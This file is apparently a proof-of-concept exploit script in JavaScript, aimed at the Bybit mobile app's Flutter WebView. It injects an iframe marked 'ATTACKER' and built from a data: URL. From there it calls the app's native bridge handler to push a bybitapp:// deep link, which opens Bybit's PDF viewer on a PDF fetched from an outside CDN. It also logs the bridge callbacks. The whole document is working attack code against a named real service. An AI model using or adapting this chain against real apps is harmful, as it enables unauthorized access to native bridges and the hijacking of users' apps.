(function () {
  document.body.innerHTML = "";
  var pre = document.createElement("pre");
  pre.style = "font:10px monospace;white-space:pre-wrap;word-break:break-all;background:#fff;color:#000;padding:6px";
  document.body.appendChild(pre);
  var L = [];
  function w(s){ L.push(s); pre.textContent = "=== IFRAME -> Router.push TEST ===\ntop: " + location.origin + "\n\n" + L.join("\n"); }
  window._b_bridge_callback_ = function (o) {
    try { var d = (typeof o === "string") ? JSON.parse(o) : o;
      w("MAIN CALLBACK " + d.moduleName + "." + d.methodName + " uniqueId=" + d.uniqueId + " code=" + d.code); }
    catch (e) { w("cb err " + e); }
  };
  window.invokeCallback = window._b_bridge_callback_;
  window.addEventListener("message", function (e) {
    if (typeof e.data === "string" && e.data.indexOf("IFRAME|") === 0) w("[iframe] " + e.data.slice(7));
  });
  w("(main frame listening)");

  var VIEWER = "https://www.bybit.com/fiat/app/pages/pdf.html?path=" +
    encodeURIComponent("https://cdn.jsdelivr.net/gh/davidxbors/pdfjs-render-testcase@687607130f2a5059d5319bef067f07f66f9b9f76/poc.pdf");
  var DEEP = "bybitapp://open/web?url=" + encodeURIComponent(VIEWER);

  // Attacker frame as a data: URL -> OPAQUE cross-origin. No hosting needed.
  var html =
    '<body style="background:#fee;font:11px monospace"><b>ATTACKER data: IFRAME</b>' +
    '<script>' +
    'function rep(s){try{parent.postMessage("IFRAME|"+s,"*")}catch(e){}}' +
    'function call(m,f,p){return window.flutter_inappwebview.callHandler("_b_bridge_"+m+"_",' +
    ' JSON.stringify({moduleName:m,methodName:f,uniqueId:"if_"+f+"_"+Math.random().toString(36).slice(2),params:p||{}}))}' +
    'rep("alive origin="+location.origin+" callHandler="+(window.flutter_inappwebview&&typeof window.flutter_inappwebview.callHandler));' +
    'var D=' + JSON.stringify(DEEP) + ';' +
    'setTimeout(function(){try{call("Router","push",{path:D}).then(function(r){rep("push(path) promise="+JSON.stringify(r))})' +
    '.catch(function(e){rep("push(path) err="+e)});rep("push(path) dispatched")}catch(e){rep("throw "+e)}},14000);' +
    'setTimeout(function(){try{call("Router","push",{deeplink:D,url:D}).then(function(r){rep("push(alt) promise="+JSON.stringify(r))})' +
    '.catch(function(e){rep("push(alt) err="+e)});rep("push(alt) dispatched")}catch(e){rep("throw2 "+e)}},26000);' +
    '<\/script></body>';
  var f = document.createElement("iframe");
  f.src = "data:text/html;charset=utf-8," + encodeURIComponent(html);
  f.style = "width:100%;height:60px;border:2px solid red";
  document.body.appendChild(f);
})();
